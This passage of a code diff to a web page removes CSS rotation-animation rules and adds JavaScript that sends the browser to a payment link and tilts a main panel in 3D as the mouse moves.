+            window.location.href = 'https://app.pushinpay.com.br/service/pay/a3321907-b6c0-462a-87bd-926a0b3217dc';
+        }
 
-from{
-transform:translate(-50%,-50%) rotate(0deg);
-}
-
-to{
-transform:translate(-50%,-50%) rotate(360deg);
-}
-
-}
-
-/* CONTAINER */
-
-.container{
-position:relative;
-z-index:2;
-width:100%;
-max-width:390
+        document.addEventListener('mousemove', (e) => {
+            const panel = document.getElementById('main-container');
+            const xAxis = (window.innerWidth / 2 - e.pageX) / 25;
+            const yAxis = (window.innerHeight / 2 - e.pageY) / 25;
+            panel.style.transform = `rotateY(${xAxis}deg) rotateX(${yAxis}deg)`;
+        });
+    </script>
+</body>
+</html>
